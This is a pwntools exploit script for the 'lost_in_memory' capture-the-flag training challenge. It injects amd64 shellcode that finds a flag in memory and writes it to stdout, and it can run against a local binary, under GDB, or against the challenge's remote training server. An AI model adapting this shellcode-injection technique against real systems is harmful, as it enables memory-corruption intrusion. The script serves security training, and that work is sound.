from pwn import *

CHALL_PATH = "./lost_in_memory"
#brva 0x13D3
#brva 0x145A
COMMANDS = """
brva 0xA0F
c
"""

context.arch = "amd64"

if args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS)
    #input("wait")
elif args.REM:
    c = remote("lost-in-memory.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process(CHALL_PATH)

# flag is put in memory in a page. Jump to it, copy address and move it to flag start, 
# which is before a stub of len 0x37 and the flag len of 0x30. Add also the len of previous instructions, 0x7.
# Then write the content to stdout
asm_shell = """
lea rax, [rip]
sub rax, 0x6e
mov rdi, 1 
mov rsi, rax 
mov rdx, 47 
mov rax, 1
syscall
"""

c.recvuntil(b"> ")

c.send(asm(asm_shell))


c.interactive()